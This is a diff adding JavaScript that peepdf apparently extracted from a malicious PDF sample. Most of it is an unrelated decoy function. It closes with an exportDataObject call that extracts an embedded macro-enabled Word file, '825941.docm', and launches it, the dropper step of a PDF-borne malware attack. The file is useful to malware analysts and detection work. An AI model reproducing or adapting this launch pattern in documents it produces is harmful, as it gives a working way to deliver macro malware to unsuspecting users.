@@ -1,0 +1,17 @@
+// peepdf comment: Javascript code located in object 5 (version 0)
+
+function isFinished(msg) {
+    var socket = msg.socket;
+    if (typeof msg.finished === 'boolean') {
+        return Boolean(msg.finished || (socket && !socket.writable));
+    };
+    if (typeof msg.complete === 'boolean') {
+        return Boolean(msg.upgrade || !socket || !socket.readable || (msg.complete && !msg.readable));
+    };
+    return undefined;
+};
+this.exportDataObject({
+    cName: "825941.docm",
+    nLaunch: 2
+});
+
